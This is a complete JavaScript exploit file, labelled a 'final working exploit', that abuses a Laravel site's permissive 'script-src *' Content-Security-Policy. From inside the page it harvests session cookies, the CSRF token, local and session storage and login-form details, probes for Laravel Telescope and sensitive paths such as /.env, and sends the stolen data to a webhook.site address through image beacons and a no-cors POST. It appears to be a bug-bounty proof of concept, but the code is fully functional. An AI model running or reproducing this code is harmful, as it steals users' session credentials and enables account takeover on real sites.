// FINAL WORKING EXPLOIT - telescope-exploit.js
(function() {
  console.log('ðŸ”“ CSP script-src * Exploit - Starting...');
  
  const WEBHOOK = 'https://webhook.site/701e5e4d-dc48-4c08-936a-46abb07b1b77';
  
  // Collect ALL data
  const exploitData = {
    // Target information
    target: {
      url: window.location.href,
      domain: document.domain,
      hostname: window.location.hostname,
      path: window.location.pathname,
      protocol: window.location.protocol
    },
    
    // Timestamp
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    
    // CSP Analysis (CRITICAL VULNERABILITY)
    csp: {
      raw: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || '',
      hasScriptSrcStar: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content?.includes('script-src *') || false,
      hasSyntaxError: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content?.includes('https//') || false,
      directives: document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content?.split(';').filter(d => d.trim()) || []
    },
    
    // Authentication Data (VERY SENSITIVE)
    authentication: {
      // Session cookies
      cookies: {},
      
      // CSRF token (for CSRF attacks)
      csrfToken: document.querySelector('input[name="_token"]')?.value || null,
      
      // Login form details (for credential stuffing)
      loginForm: {
        exists: document.querySelector('form[action*="login"]') !== null,
        action: document.querySelector('form[action*="login"]')?.action || '',
        method: document.querySelector('form[action*="login"]')?.method || '',
        usernameField: document.querySelector('input[name="username"]')?.name || '',
        passwordField: document.querySelector('input[type="password"]')?.name || '',
        rememberMe: document.querySelector('input[name="remember"]') !== null
      },
      
      // Local storage (may contain tokens)
      localStorage: {},
      
      // Session storage
      sessionStorage: {}
    },
    
    // Application Discovery
    discovery: {
      // Framework detection
      framework: {
        laravel: document.querySelector('input[name="_token"]') !== null,
        livewire: window.Livewire !== undefined,
        jquery: window.jQuery !== undefined,
        vue: window.Vue !== undefined,
        react: window.React !== undefined
      },
      
      // Telescope status
      telescope: {
        accessible: null,
        status: null,
        checkedAt: null
      },
      
      // Admin endpoints
      adminEndpoints: [],
      
      // API endpoints
      apiEndpoints: []
    },
    
    // Vulnerabilities found
    vulnerabilities: [],
    
    // Attack chain demonstrated
    attackChain: [
      '1. CSP script-src * allows external scripts',
      '2. Load exploit from GitHub (raw.githubusercontent.com)',
      '3. Execute arbitrary JavaScript in victim context',
      '4. Steal session cookies and CSRF tokens',
      '5. Discover internal endpoints',
      '6. Exfiltrate data to attacker server'
    ]
  };
  
  // Update status function
  function logStatus(message, progress) {
    console.log(`[${progress}%] ${message}`);
  }
  
  // Main exploit execution
  async function execute() {
    logStatus('Starting CSP exploit analysis...', 10);
    
    // ===== STEP 1: ANALYZE CSP =====
    if (exploitData.csp.hasScriptSrcStar) {
      exploitData.vulnerabilities.push({
        id: 'CSP_SCRIPT_SRC_STAR',
        severity: 'CRITICAL',
        description: 'CSP allows scripts from any domain (script-src *)',
        impact: 'Allows loading and executing arbitrary JavaScript from attacker-controlled domains'
      });
      logStatus('ðŸš¨ CRITICAL: CSP has script-src *', 20);
    }
    
    if (exploitData.csp.hasSyntaxError) {
      exploitData.vulnerabilities.push({
        id: 'CSP_SYNTAX_ERROR',
        severity: 'HIGH',
        description: 'CSP has syntax error (https// instead of https://)',
        impact: 'May cause CSP to be ignored by some browsers'
      });
      logStatus('âš ï¸ CSP has syntax error', 25);
    }
    
    // ===== STEP 2: COLLECT AUTHENTICATION DATA =====
    logStatus('Collecting authentication data...', 30);
    
    // Parse cookies
    document.cookie.split(';').forEach(cookie => {
      const [key, ...valueParts] = cookie.trim().split('=');
      const value = valueParts.join('=');
      if (key && value) {
        exploitData.authentication.cookies[key] = value;
      }
    });
    
    // Collect localStorage
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        exploitData.authentication.localStorage[key] = localStorage.getItem(key);
      }
    } catch(e) {}
    
    // Collect sessionStorage
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        exploitData.authentication.sessionStorage[key] = sessionStorage.getItem(key);
      }
    } catch(e) {}
    
    // ===== STEP 3: CHECK TELESCOPE =====
    logStatus('Testing Laravel Telescope...', 50);
    try {
      const response = await fetch('/telescope');
      exploitData.discovery.telescope = {
        accessible: response.ok,
        status: response.status,
        checkedAt: new Date().toISOString()
      };
      
      if (response.ok) {
        exploitData.vulnerabilities.push({
          id: 'TELESCOPE_NO_AUTH',
          severity: 'CRITICAL',
          description: 'Laravel Telescope accessible without authentication',
          impact: 'Complete application debug data exposure (requests, queries, logs, sessions)'
        });
        logStatus('âœ… Telescope accessible without authentication!', 55);
      } else {
        logStatus('Telescope not accessible', 55);
      }
    } catch(error) {
      exploitData.discovery.telescope = {
        accessible: false,
        error: error.message,
        checkedAt: new Date().toISOString()
      };
      logStatus('Telescope check failed', 55);
    }
    
    // ===== STEP 4: DISCOVER ENDPOINTS =====
    logStatus('Discovering internal endpoints...', 60);
    
    const endpointsToCheck = [
      '/admin', '/dashboard', '/manager', '/control-panel',
      '/api', '/api/v1', '/api/v2', '/api/admin',
      '/config', '/env', '/.env', '/storage',
      '/vendor', '/composer.json', '/artisan',
      '/horizon', '/nova', '/log-viewer'
    ];
    
    for (const endpoint of endpointsToCheck) {
      try {
        const response = await fetch(endpoint, { 
          method: 'HEAD',
          credentials: 'include'
        });
        
        if (response.status !== 404) {
          exploitData.discovery.adminEndpoints.push({
            endpoint: endpoint,
            status: response.status,
            accessible: response.ok,
            checkedAt: new Date().toISOString()
          });
        }
      } catch(e) {}
    }
    
    // ===== STEP 5: PREPARE EXFILTRATION =====
    logStatus('Preparing data exfiltration...', 80);
    
    // Create a clean data summary for exfiltration
    const exfilData = {
      summary: {
        vulnerabilities: exploitData.vulnerabilities.length,
        cookies: Object.keys(exploitData.authentication.cookies).length,
        csrfTokenExposed: exploitData.authentication.csrfToken !== null,
        telescopeAccessible: exploitData.discovery.telescope.accessible,
        endpointsDiscovered: exploitData.discovery.adminEndpoints.length
      },
      criticalData: {
        cookies: exploitData.authentication.cookies,
        csrfToken: exploitData.authentication.csrfToken,
        loginForm: exploitData.authentication.loginForm
      },
      vulnerabilities: exploitData.vulnerabilities,
      target: exploitData.target,
      timestamp: exploitData.timestamp
    };
    
    // ===== STEP 6: EXFILTRATE DATA =====
    logStatus('Exfiltrating data to attacker server...', 90);
    
    // Method 1: Image beacon (always works, no CORS)
    const img1 = new Image();
    const query1 = new URLSearchParams({
      type: 'csp_exploit_summary',
      target: exploitData.target.domain,
      time: Date.now(),
      data: btoa(JSON.stringify(exfilData))
    }).toString();
    img1.src = `${WEBHOOK}?${query1}`;
    
    // Method 2: Another image beacon with full data (truncated)
    const img2 = new Image();
    const fullDataStr = JSON.stringify(exploitData);
    const truncatedData = fullDataStr.length > 3000 ? fullDataStr.substring(0, 3000) + '...TRUNCATED' : fullDataStr;
    const query2 = new URLSearchParams({
      type: 'csp_exploit_full',
      target: exploitData.target.domain,
      time: Date.now(),
      data: btoa(truncatedData)
    }).toString();
    img2.src = `${WEBHOOK}?${query2}`;
    
    // Method 3: Fetch with no-cors (silent fail if blocked)
    try {
      await fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
          type: 'csp_exploit_post',
          target: exploitData.target.domain,
          timestamp: new Date().toISOString(),
          summary: exfilData.summary
        })
      });
    } catch(e) {}
    
    // ===== STEP 7: COMPLETE =====
    logStatus('âœ… Exploit completed successfully!', 100);
    
    // Display results in console
    console.group('ðŸ”“ EXPLOIT RESULTS - CSP script-src *');
    console.log('Target:', exploitData.target.url);
    console.log('CSP Vulnerabilities:', exploitData.vulnerabilities.length);
    exploitData.vulnerabilities.forEach(v => {
      console.log(`  ${v.severity}: ${v.id} - ${v.description}`);
    });
    console.log('Cookies found:', Object.keys(exploitData.authentication.cookies));
    console.log('CSRF Token:', exploitData.authentication.csrfToken ? 'EXPOSED ðŸš¨' : 'Not found');
    console.log('Telescope:', exploitData.discovery.telescope.accessible ? 'ACCESSIBLE ðŸš¨' : 'Not accessible');
    console.log('Internal endpoints:', exploitData.discovery.adminEndpoints.map(e => e.endpoint));
    console.groupEnd();
    
    // Create visual indicator
    setTimeout(() => {
      const indicator = document.createElement('div');
      indicator.innerHTML = `
        <div style="
          position: fixed;
          top: 10px;
          right: 10px;
          background: #ff4757;
          color: white;
          padding: 10px 15px;
          border-radius: 5px;
          font-family: Arial, sans-serif;
          font-weight: bold;
          font-size: 14px;
          z-index: 999999;
          box-shadow: 0 4px 12px rgba(255,71,87,0.3);
          border: 2px solid white;
        ">
          ðŸ”“ CSP Vulnerability Demonstrated
        </div>
      `;
      document.body.appendChild(indicator);
      
      // Remove after 5 seconds
      setTimeout(() => indicator.remove(), 5000);
    }, 1000);
  }
  
  // Start the exploit
  execute();
  
})();
